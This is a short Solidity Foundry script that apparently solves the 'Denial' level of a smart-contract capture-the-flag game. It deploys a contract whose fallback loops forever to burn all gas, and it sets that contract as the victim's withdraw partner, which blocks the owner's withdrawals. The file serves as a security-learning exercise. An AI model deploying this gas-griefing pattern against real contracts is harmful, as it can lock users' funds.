// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/20-Denial/Denial.sol";


contract ExploitScript is Script {
    DenialAttack DenialAttackAddr;
    Denial level20 = Denial(payable(0x126539d3af7d0e5fE48C05AA5217314850724E6F));

    function run() public {
        vm.startBroadcast();
        DenialAttackAddr = new DenialAttack();
        level20.setWithdrawPartner(address(DenialAttackAddr));
         vm.stopBroadcast();
    }
}


contract DenialAttack {

  fallback() external payable {
      // consume all the gas
      while(true) {}
  }
}